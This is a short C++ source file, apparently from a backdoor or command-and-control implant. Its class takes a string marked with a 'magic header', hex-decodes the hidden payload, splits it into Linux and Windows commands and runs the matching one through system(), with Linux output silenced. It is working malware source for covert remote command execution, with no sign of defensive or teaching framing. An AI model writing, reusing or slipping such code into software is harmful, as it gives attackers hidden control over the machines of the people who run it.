class process_commands {
    private:
        string magic_header, encoded_command, decoded_command,
            windows_command, linux_command;
    public:
        process_commands(string header, string ecommand) {
            magic_header = header;
            encoded_command = ecommand;
        }

        void strip_header(void) {
            encoded_command = encoded_command.substr(magic_header.size(), encoded_command.size());
        }

        void decode_cmd(void) {
            // https://stackoverflow.com/questions/3790613/how-to-convert-a-string-of-hex-values-to-a-string
            size_t len = encoded_command.length();
            for(int i=0; i< len; i+=2)
            {
                string byte = encoded_command.substr(i,2);
                char chr = (char) (int)strtol(byte.c_str(), NULL, 16);
                decoded_command.push_back(chr);
            }
        }

        void execute_cmd(void) {
            #ifdef __linux__
                system((linux_command + " >/dev/null 2>/dev/null").c_str());
            #elif _WIN32
                system(windows_command.c_str());
            #else
            #endif
        }

        void get_correct_cmd(void) {
            string seperator = "!&";
            if(decoded_command.find(seperator) != -1) {
                size_t sep_index = decoded_command.find(seperator);
                windows_command = decoded_command.substr(sep_index + seperator.size(), decoded_command.size()); 
                linux_command = decoded_command.substr(0, sep_index);
            }
        }
};